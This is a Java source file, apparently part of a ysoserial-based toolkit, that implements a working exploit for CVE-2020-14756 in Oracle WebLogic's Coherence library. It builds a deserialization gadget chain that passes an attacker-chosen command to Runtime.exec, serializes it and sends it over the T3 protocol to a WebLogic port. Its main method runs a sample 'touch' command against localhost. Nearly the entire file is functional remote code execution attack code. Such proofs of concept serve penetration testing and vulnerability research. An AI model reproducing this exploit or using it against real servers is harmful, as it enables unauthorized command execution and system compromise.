package unserWeblogic.gadgets;
// coherence-rest.jar

import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.SortedBag;
import com.tangosol.util.aggregator.TopNAggregator;
import unserWeblogic.T3.T3;
import ysoserial.Serializer;
import ysoserial.secmgr.ExecCheckingSecurityManager;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.concurrent.Callable;

public class CVE_2020_14756 implements ObjectPayload<Object>{

    boolean[] protocolType = {true, false, false}; //T3, IIOP, HTTP

    public Object getObject(final String command) throws Exception{
        MvelExtractor extractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"" + command +"\");");
        MvelExtractor extractor2 = new MvelExtractor("");

        try {
            SortedBag sortedBag = new TopNAggregator.PartialResult(extractor2, 2);
            AttributeHolder attributeHolder = new AttributeHolder();
            sortedBag.add(1);

            Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(sortedBag, extractor);

            Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
            setInternalValue.setAccessible(true);
            setInternalValue.invoke(attributeHolder, sortedBag);

            return attributeHolder;
//            FileOutputStream fileOutputStream = new FileOutputStream(new File("cve_2020_14756.ser"));
//            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
//            objectOutputStream.writeObject(attributeHolder);

        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
        // ensure payload generation doesn't throw an exception
        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>(){
            public byte[] call() throws Exception {
                final String command = args.length > 0 && args[0] != null ? args[0] : "calc";

                System.out.println("generating payload object(s) for command: '" + command + "'");

                ObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(command);

                System.out.println("serializing payload");
                byte[] ser = Serializer.serialize(objBefore);
                Utils.releasePayload(payload, objBefore);
                return ser;
            }});

        try {
            System.out.println(serialized);
            T3.send("127.0.0.1", "7001", serialized);
//            final Object objAfter = Deserializer.deserialize(serialized);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void main(String[] args) throws Exception {
        run(CVE_2020_14756.class, new String[]{"touch /tmp/mercy.txt"});
//        run(CVE_2020_14756.class, new String[]{"calc"});
        //"touch /tmp/mercy.txt";
    }


}
